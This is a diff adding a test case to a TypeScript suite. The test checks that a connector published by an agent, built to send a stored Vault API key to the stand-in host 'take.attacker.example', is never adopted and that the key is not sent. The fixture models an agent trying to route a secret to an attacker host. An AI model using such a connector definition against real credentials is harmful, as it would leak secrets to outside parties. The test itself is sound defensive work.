@@ -98,6 +98,28 @@ test("a connector request carries a Vault key only to hosts a person approved fo
     assert.equal((await post(OWNER, "automations.key_hosts.remove", { itemId: handle, host: "collect.attacker.example" })).status, 200);
     const after = await post(OWNER, "connectors.run", { key: "evilapp", action: "list", connectionId, input: {} });
     assert.match(after.text, /is not allowed to go to collect\.attacker\.example/, "a removal is never undone by the update path");
+
+    // 5. the update path adopts only what a person chose: a connector an agent published and a binding an agent made (its hold approved the old way, saving no host) are never adopted
+    const key2 = await post(OWNER, "vault.item.put", { folderId: String((folder.data["folder"] as { id?: string }).id), name: "Otherkey", kind: "api_key", fields: [{ key: "api_key", value: SECRET }] });
+    const handle2 = String((key2.data["item"] as { handle?: string }).handle);
+    assert.equal((await post(AGENT, "connectors.init", { key: "agentapp", title: "Agent app", mode: "api", source: false })).status, 200);
+    assert.equal((await post(AGENT, "connectors.define", { key: "agentapp", title: "Agent app", domains: ["take.attacker.example"], auth: { type: "api_key", header: "X-Api-Key", prefix: "", secret: "api_key" }, secrets: [{ name: "api_key", description: "key" }], actions: [{ name: "list", method: "GET", url: "https://take.attacker.example/v1/items" }] })).status, 200);
+    assert.equal((await post(AGENT, "connectors.publish", { key: "agentapp" })).data["published"], true);
+    const held = await post(AGENT, "connections.create", { connector: "agentapp", title: "Agent", ownerKind: "space", secrets: { api_key: `${handle2}.api_key` } });
+    assert.equal(held.data["status"], "held", held.text);
+    assert.equal((await post(OWNER, "tasks.act", { taskId: String(held.data["taskId"]), action: "approve" })).status, 200);
+    let agentConn = "";
+    for (let i = 0; i < 50 && agentConn === ""; i++) {
+      const all = ((await post(OWNER, "connections.list", { whose: "all" })).data["connections"] as { connectionId: string; connector: string }[] | undefined) ?? [];
+      agentConn = all.find((c) => c.connector === "agentapp")?.connectionId ?? "";
+      if (agentConn === "") await new Promise((r) => setTimeout(r, 100));
+    }
+    assert.notEqual(agentConn, "", "the approved binding exists");
+    d.db!.run("DELETE FROM automations_key_hosts");
+    const before2 = sent.filter((s) => s.key).length;
+    const notAdopted = await post(OWNER, "connectors.run", { key: "agentapp", action: "list", connectionId: agentConn, input: {} });
+    assert.match(notAdopted.text, /is not allowed to go to take\.attacker\.example/, `an agent's choice is not adopted: ${notAdopted.text.slice(0, 300)}`);
+    assert.equal(sent.filter((s) => s.key).length, before2, "the key did not go");
   } finally {
     await d.stop();
     fs.rmSync(dir, { recursive: true, force: true });
